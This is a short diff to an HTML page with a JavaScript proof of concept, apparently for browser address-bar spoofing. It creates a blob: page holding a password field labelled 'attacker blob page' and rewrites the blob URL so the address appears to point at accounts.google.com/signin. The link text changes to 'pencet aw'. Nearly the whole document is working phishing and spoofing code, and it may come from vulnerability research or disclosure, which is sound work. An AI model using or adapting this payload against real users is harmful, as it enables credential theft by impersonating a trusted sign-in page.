@@ -1,7 +1,8 @@
 <script>
 function f(){
-  b = new Blob(["<title>accounts.google.com</title><h1>attacker blob page</h1><input autofocus placeholder=password>"], {type:"text/html"});
-  location = URL.createObjectURL(b) + "#https://accounts.google.com/signin";
+  b = new Blob(["<h1>attacker blob page</h1><input autofocus placeholder=password>"], {type:"text/html"});
+  u = URL.createObjectURL(b);
+  location = u.replace(location.origin, location.origin + "/https://accounts.google.com/signin") + "#x";
 }
 </script>
-<a href="#" onclick="f()">click</a>
+<a href="#" onclick="f()">pencet aw</a>
